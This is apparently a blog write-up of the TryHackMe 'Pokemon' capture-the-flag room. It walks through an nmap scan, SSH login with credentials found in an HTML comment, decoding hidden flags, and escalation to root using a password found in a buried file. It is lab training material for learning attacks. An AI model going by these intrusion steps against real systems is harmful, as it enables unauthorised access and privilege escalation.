---
title: "Pokemon"
date: 2024-03-03T11:51:00+01:00
draft: false
categories:
  - TryHackMe
---

{{< post-img src="pokemon.png" alt="pokemon" style="width: 200px;" >}}

## Gotta catch 'em all

I wanna be the very best...LIKE NO ONE EVER WAS!

```bash

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:14:75:69:1e:a9:59:5f:b2:3a:69:1c:6c:78:5c:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5csEY9HQAEkHk16FMvfJVYh4YzdcIRCQpv2IOon6FHy3la/DkwscWsUIp7hXmMeW35Oa7OfI08LvyokxDX8bKgKUpU/dP05LNyDzv17MKB6rt3SkPbDv3XVMlu101/wkIMIOdJ38TW0+vVlU89cjQ5XiSDep4kKm/+6fEl2zM5x60DKexOOYTQ3t8SRkBV4TnWmr9wDQCDH/Kc8Pl2W9GM7hgAhVB9uUhN/EBCUbwZ8xE0ToOQz+QIkCTEuwD/AhDoURmRzv7EGut0TBrUPvFCK19v2Crw/BVQc07taDkei4N0/MwpXvI4CnJ6jpGOgxTMePk/nZusz/XbnUtnIqD
|   256 23:f5:fb:e7:57:c2:a5:3e:c2:26:29:0e:74:db:37:c2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP9bcehMnrIADUJHvNw7/zastIegVYRSXcF40Pky1Yllzx872e/LUM6UdTNaC4gffBnEpKcmwE9wjR+J6lfR8Yk=
|   256 f1:9b:b5:8a:b9:29:aa:b6:aa:a2:52:4a:6e:65:95:c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICabmX4EeiR66bXPzMHbCZpkcUu+GSkDJP1nZ2+30Vm+
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Can You Find Them All?
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Grass type Pokemon

The website source code shows this interesting javascript

```javascript
     const randomPokemon = [
      'Bulbasaur', 'Charmander', 'Squirtle',
      'Snorlax',
      'Zapdos',
      'Mew',
      'Charizard',
      'Grimer',
      'Metapod',
      'Magikarp'
     ];
     const original = randomPokemon.sort((pokemonName) => {
      const [aLast] = pokemonName.split(', ');
     });

     console.log(original);

```

Also this:

```html
        <pokemon>:<hack_the_pokemon>
         <!--(Check console for extra surprise!)-->
```

Hmmmm...

```bash
─(13:10:05)──> ssh pokemon@10.10.126.68                                                                                                                                1 ↵ ──(dim.,mars03)─┘
pokemon@10.10.126.68's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-112-generic x86_64)
...
pokemon@root:~$
```

That was quick...

```bash
pokemon@root:~$ ls Desktop
P0kEmOn.zip
pokemon@root:~$ unzip Desktop/P0kEmOn.zip
Archive:  Desktop/P0kEmOn.zip
   creating: P0kEmOn/
  inflating: P0kEmOn/grass-type.txt
```

Just decode the hex for first answer

## Water type Pokemon

```bash
pokemon@root:/var/www/html$ ls
index.html  water-type.txt
pokemon@root:/var/www/html$ cat water-type.txt
```

Just decode the ROT for second answer

## Fire type Pokemon

There was no hint for this one but if we follow the same file naming logic////

```bash
pokemon@root:/etc/why_am_i_here?$ find / -type f -name fire-type.txt
...
find: '/etc/polkit-1/localauthority': Permission denied
/etc/why_am_i_here?/fire-type.txt
find: '/etc/cups/ssl': Permission denied
...
```

This one is base64

## Privilege Escalation

Ok this one was a bit guessy and needed a lot of searching around

In your user folder, go to "Videos" folder and keep digging

```bash
pokemon@root:~/Videos/Gotta/Catch/Them/ALL!$ cat Could_this_be_what_Im_looking_for?.cplusplus
# include <iostream>

int main() {
 std::cout << "ash : EDITED-PASSWORD"
 return 0;
```

now with the credentials we can become ash

```bash
pokemon@root:~/Videos/Gotta/Catch/Them/ALL!$ su ash
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /home/ash/.bashrc: Permission denied
ash@root:/home/pokemon/Videos/Gotta/Catch/Them/ALL!$ sudo su root
[sudo] password for ash:
root@root:/home/pokemon/Videos/Gotta/Catch/Them/ALL!# whoami
root
```

Lol that was unexpectedly easy, but rather fun. Root's favorite pokemon can be found in "home"
and honestly Ii was expecting it to be that one.

Off to the Victory road!!
